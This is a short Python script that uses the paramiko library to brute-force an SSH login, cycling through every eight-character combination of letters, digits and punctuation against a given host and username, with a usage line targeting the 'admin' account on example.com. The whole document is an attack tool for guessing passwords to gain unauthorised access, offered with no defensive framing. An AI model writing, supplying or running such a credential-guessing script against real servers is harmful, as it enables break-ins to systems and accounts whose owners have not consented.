import paramiko
import itertools
import string

def brute_force_ssh(hostname, port, username):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    # Generate all possible combinations of passwords
    characters = string.ascii_letters + string.digits + string.punctuation
    passwords = itertools.product(characters, repeat=8)

    for password in passwords:
        try:
            client.connect(hostname, port=port, username=username, password=''.join(password))
            print(f"Successful login! Username: {username}, Password: {''.join(password)}")
            client.close()
            break
        except paramiko.AuthenticationException:
            pass

    print("Brute forcing complete.")

# Usage example
brute_force_ssh('example.com', 22, 'admin')

